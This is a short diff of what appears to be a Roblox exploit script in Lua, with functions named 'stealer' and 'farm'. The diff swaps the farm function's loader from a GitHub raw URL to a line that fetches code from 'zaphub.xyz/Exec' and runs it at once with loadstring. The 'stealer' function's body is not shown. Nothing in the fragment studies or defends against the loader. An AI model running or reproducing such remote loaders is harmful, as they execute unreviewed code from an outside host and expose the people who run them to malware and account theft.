@@ -3,7 +3,7 @@ local function stealer()
 end
 local function farm()
  
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraScript/Script/main/PetSimSquid"))())
+loadstring(game:HttpGet('https://zaphub.xyz/Exec'))()
 
 end
 
